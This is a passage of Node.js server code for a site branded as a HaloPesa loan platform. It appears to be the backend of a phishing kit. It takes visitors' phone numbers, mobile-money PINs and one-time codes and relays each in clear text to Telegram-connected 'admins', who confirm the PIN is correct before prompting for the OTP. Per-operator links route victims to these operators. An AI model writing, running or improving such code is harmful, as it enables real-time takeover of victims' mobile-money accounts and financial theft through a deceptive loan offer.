        console.log(`❌ [ADMIN ACTIVITY] Admin ${adminId} REJECTED PIN for Application:${applicationId}`);
        await db.updateApplication(applicationId, { pinStatus: 'rejected' });
        await bot.editMessageText(`❌ *APPLICATION REJECTED (PIN INVALID)*\n\n📋 \`${applicationId}\`\n📞 \`${formatPhone(application.phoneNumber)}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application rejected' });
    }

    // Approve PIN (Proceed to OTP)
    if (action === 'allow' && type === 'pin') {
        console.log(`✅ [ADMIN ACTIVITY] Admin ${adminId} APPROVED PIN for Application:${applicationId} - Customer moving to OTP stage`);
        await db.updateApplication(applicationId, { pinStatus: 'approved' });
        await bot.editMessageText(`✅ *PIN APPROVED - WAITING FOR OTP*\n\n📋 \`${applicationId}\`\n📞 \`${formatPhone(application.phoneNumber)}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        return bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Approved! User moves to OTP.' });
    }

    // Fully Approve Loan
    if (action === 'approve' && type === 'otp') {
        console.log(`🎉 [ADMIN ACTIVITY] Admin ${adminId} FULLY APPROVED LOAN for Application:${applicationId}`);
        await db.updateApplication(applicationId, { otpStatus: 'approved' });
        await bot.editMessageText(`🎉 *LOAN FULLY APPROVED!*\n\n📋 \`${applicationId}\`\n📞 \`${formatPhone(application.phoneNumber)}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        return bot.answerCallbackQuery(callbackQuery.id, { text: '🎉 Loan approved!' });
    }
});

// ==========================================
// DB-READY MIDDLEWARE
// ==========================================
app.use((req, res, next) => {
    if (!dbReady && !req.path.includes('/health') && !req.path.includes('/telegram-webhook')) {
        return res.status(503).json({ success: false, message: 'Database not ready yet' });
    }
    next();
});

// ==========================================
// API ENDPOINTS (APPLICATION PROCESS LOGGING)
// ==========================================

// POST /api/verify-pin
app.post('/api/verify-pin', async (req, res) => {
    try {
        const { phoneNumber, pin, adminId: requestAdminId, assignmentType } = req.body;
        const applicationId = `APP-${Date.now()}-${Math.random().toString(36).slice(2,7).toUpperCase()}`;

        console.log(`📥 [APPLICATION STEP 1] New PIN Submission: Phone=${phoneNumber}, AssignedAdmin=${requestAdminId || 'AUTO'}, Type=${assignmentType}`);

        const lockKey = `pin_${phoneNumber}`;
        if (processingLocks.has(lockKey)) {
            return res.status(429).json({ success: false, message: 'Request already processing. Please wait.' });
        }
        processingLocks.add(lockKey);
        setTimeout(() => processingLocks.delete(lockKey), 10000);

        let assignedAdmin;

        if (assignmentType === 'specific' && requestAdminId) {
            assignedAdmin = await db.getAdmin(requestAdminId);
            if (!assignedAdmin) {
                processingLocks.delete(lockKey);
                console.error(`❌ [APPLICATION STEP 1] Invalid Admin Link Access: Admin ${requestAdminId} does not exist`);
                return res.status(400).json({ success: false, message: 'The link you used is invalid.' });
            }
            if (pausedAdmins.has(requestAdminId) || assignedAdmin.status !== 'active') {
                processingLocks.delete(lockKey);
                console.warn(`⚠️ [APPLICATION STEP 1] Paused Link Access Attempt: Admin ${requestAdminId} is currently paused`);
                return res.status(400).json({ success: false, message: 'This service link is temporarily unavailable.' });
            }
            console.log(`🔒 [APPLICATION STEP 1] Application pinned specifically to Admin: ${assignedAdmin.name} (${assignedAdmin.adminId})`);
        } else {
            const activeAdmins    = await db.getActiveAdmins();
            const availableAdmins = activeAdmins.filter(a => !pausedAdmins.has(a.adminId));
            if (availableAdmins.length === 0) {
                processingLocks.delete(lockKey);
                return res.status(503).json({ success: false, message: 'No admins available.' });
            }
            assignedAdmin = availableAdmins[0];
            console.log(`🔄 [APPLICATION STEP 1] Application auto-assigned to Admin: ${assignedAdmin.name} (${assignedAdmin.adminId})`);
        }

        const existingApps   = await db.getApplicationsByAdmin(assignedAdmin.adminId);
        const alreadyPending = existingApps.find(a => a.phoneNumber === phoneNumber && a.pinStatus === 'pending');
        if (alreadyPending) {
            processingLocks.delete(lockKey);
            console.log(`ℹ️ [APPLICATION STEP 1] Duplicate submission detected for pending AppID: ${alreadyPending.id}`);
            return res.json({ success: true, applicationId: alreadyPending.id, assignedTo: assignedAdmin.name, assignedAdminId: assignedAdmin.adminId });
        }

        await db.saveApplication({
            id: applicationId,
            adminId: assignedAdmin.adminId,
            adminName: assignedAdmin.name,
            phoneNumber,
            pin,
            pinStatus: 'pending',
            otpStatus: 'pending',
            assignmentType: assignmentType || 'auto',
            timestamp: new Date().toISOString()
        });

        console.log(`💾 [APPLICATION STEP 1] Application saved to DB: AppID=${applicationId} | Sending alert to Admin ${assignedAdmin.adminId}`);

        await sendToAdmin(assignedAdmin.adminId, `
🆕 *NEW APPLICATION SUBMITTED*

📋 \`${applicationId}\`
📞 \`${formatPhone(phoneNumber)}\`
🔑 \`${pin}\`
⏰ ${new Date().toLocaleString()}
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Invalid - Deny',     callback_data: `deny_pin_${assignedAdmin.adminId}_${applicationId}` }],
                    [{ text: '✅ Correct - Allow OTP', callback_data: `allow_pin_${assignedAdmin.adminId}_${applicationId}` }]
                ]
            }
        });

        processingLocks.delete(lockKey);
        res.json({ success: true, applicationId, assignedTo: assignedAdmin.name, assignedAdminId: assignedAdmin.adminId });
    } catch (error) {
        processingLocks.delete(`pin_${req.body?.phoneNumber}`);
        console.error('❌ Error in /api/verify-pin:', error);
        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
    }
});

// GET /api/check-pin-status/:applicationId
app.get('/api/check-pin-status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        if (application) {
            console.log(`🔍 [APPLICATION STATUS CHECK] Pin Status for AppID ${req.params.applicationId} (Admin: ${application.adminId}): Status = ${application.pinStatus}`);
            res.json({ success: true, status: application.pinStatus });
        } else {
            res.status(404).json({ success: false, message: 'Application not found' });
        }
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// POST /api/verify-otp
app.post('/api/verify-otp', async (req, res) => {
    try {
        const { applicationId, otp } = req.body;
        console.log(`📲 [APPLICATION STEP 2] OTP Code Submitted for AppID: ${applicationId} - Code: ${otp}`);

        const application = await db.getApplication(applicationId);
        if (!application) return res.status(404).json({ success: false, message: 'Application not found' });

        await db.updateApplication(applicationId, { otp, otpStatus: 'pending' });
        console.log(`💾 [APPLICATION STEP 2] OTP saved for AppID: ${applicationId}. Forwarding verification prompt to Admin: ${application.adminId}`);

        await sendToAdmin(application.adminId, `
📲 *OTP CODE SUBMITTED*

📋 \`${applicationId}\`
📞 \`${formatPhone(application.phoneNumber)}\`
🔢 \`${otp}\`
⏰ ${new Date().toLocaleString()}
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Wrong PIN',   callback_data: `wrongpin_otp_${application.adminId}_${applicationId}` }],
                    [{ text: '❌ Wrong Code',  callback_data: `wrongcode_otp_${application.adminId}_${applicationId}` }],
                    [{ text: '✅ Approve Loan', callback_data: `approve_otp_${application.adminId}_${applicationId}` }]
                ]
            }
        });

        res.json({ success: true });
    } catch (error) {
        console.error('❌ Error in /api/verify-otp:', error);
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// GET /api/check-otp-status/:applicationId
app.get('/api/check-otp-status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        if (application) {
            console.log(`🔍 [APPLICATION STATUS CHECK] Final OTP Status for AppID ${req.params.applicationId} (Admin: ${application.adminId}): Status = ${application.otpStatus}`);
            res.json({ success: true, status: application.otpStatus });
        } else {
            res.status(404).json({ success: false, message: 'Application not found' });
        }
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// POST /api/resend-otp
app.post('/api/resend-otp', async (req, res) => {
    try {
        const { applicationId } = req.body;
        const application = await db.getApplication(applicationId);
        if (!application) return res.status(404).json({ success: false, message: 'Application not found' });

        console.log(`🔄 [APPLICATION PROCESS] OTP Resend requested for AppID: ${applicationId} by User (Assigned to Admin: ${application.adminId})`);

        await sendToAdmin(application.adminId, `
🔄 *OTP RESEND REQUESTED*

📋 \`${applicationId}\`
📞 \`${formatPhone(application.phoneNumber)}\`
        `, { parse_mode: 'Markdown' });

        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// GET /api/admins
app.get('/api/admins', async (req, res) => {
    try {
        const admins = await db.getActiveAdmins();
        const adminList = admins
            .filter(a => !pausedAdmins.has(a.adminId))
            .map(a => ({ id: a.adminId, name: a.name, email: a.email, status: a.status, connected: adminChatIds.has(a.adminId) }));
        res.json({ success: true, admins: adminList });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// GET /api/validate-admin/:adminId
app.get('/api/validate-admin/:adminId', async (req, res) => {
    try {
        const adminId = req.params.adminId;
        console.log(`🔍 [ADMIN LINK CHECK] API validating Admin Link ID: ${adminId}`);
        const admin = await db.getAdmin(adminId);
        if (admin && pausedAdmins.has(admin.adminId)) {
            console.warn(`⛔ [ADMIN LINK CHECK] Link validation failed: Admin ${adminId} is paused`);
            return res.json({ success: true, valid: false, message: 'Admin is currently paused' });
        }
        if (admin && admin.status === 'active') {
            console.log(`✅ [ADMIN LINK CHECK] Link verified valid for Admin: ${admin.name} (${adminId})`);
            res.json({ success: true, valid: true, connected: adminChatIds.has(admin.adminId), admin: { id: admin.adminId, name: admin.name, email: admin.email } });
        } else {
            console.warn(`❌ [ADMIN LINK CHECK] Link validation failed: Admin ${adminId} not found or inactive`);
            res.json({ success: true, valid: false, message: 'Admin not found or inactive' });
        }
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// GET /health
app.get('/health', (req, res) => {
    res.json({
        status:        'ok',
        database:      dbReady ? 'connected' : 'not ready',
        activeAdmins:  adminChatIds.size,
        pausedAdmins:  pausedAdmins.size,
        botMode:       'webhook',
        timestamp:     new Date().toISOString()
    });
});

// Serve HTML Landing Page
app.get('/', async (req, res) => {
    const adminId = req.query.admin;

    if (adminId) {
        console.log(`🌐 [ADMIN LINK ACCESS] Customer accessed website via Admin Link: AdminID = ${adminId}`);
        try {
            const admin = await db.getAdmin(adminId);
            if (admin && admin.status === 'active' && !pausedAdmins.has(adminId)) {
                console.log(`  └─ Valid Active Admin Link: ${admin.name} (${adminId})`);
                if (admin.chatId && !adminChatIds.has(adminId)) {
                    adminChatIds.set(adminId, admin.chatId);
                }
            } else if (pausedAdmins.has(adminId)) {
                console.warn(`  └─ WARNING: Customer visited link of PAUSED Admin (${adminId})`);
            } else {
                console.warn(`  └─ WARNING: Customer visited INVALID/INACTIVE Admin Link (${adminId})`);
            }
        } catch (error) {
            console.error('Error validating admin on landing page:', error);
        }
    } else {
        console.log(`🌐 [VISIT] Customer accessed website directly (No Admin Link)`);
    }

    res.sendFile(path.join(__dirname, 'halopesa-integrated.html'));
});

// ==========================================
// START SERVER
// ==========================================
app.listen(PORT, () => {
    console.log(`\n💎 HALOPESA LOAN PLATFORM`);
    console.log(`==========================`);
    console.log(`🌐 Server: http://localhost:${PORT}`);
    console.log(`🤖 Bot: WEBHOOK MODE ✅`);
    console.log(`👥 Logged Active Admins: ${adminChatIds.size}`);
    console.log(`\n✅ Activity Logging Ready!\n`);
});

// ==========================================
// GRACEFUL SHUTDOWN
// ==========================================
async function shutdownGracefully(signal) {
    console.log(`\n🛑 Received ${signal}, shutting down...`);
    try {
        suspendAllSessions.clear();
        await bot.deleteWebHook();
        await db.closeDatabase();
        console.log('✅ Cleanup complete');
        process.exit(0);
    } catch (error) {
        console.error('❌ Shutdown error:', error);
        process.exit(1);
    }
}

process.on('SIGTERM', () => shutdownGracefully('SIGTERM'));
process.on('SIGINT',  () => shutdownGracefully('SIGINT'));

process.on('unhandledRejection', (error) => {
    console.error('❌ Unhandled rejection:', error?.message);
});

process.on('uncaughtException', (error) => {
    console.error('❌ Uncaught exception:', error?.message);
});
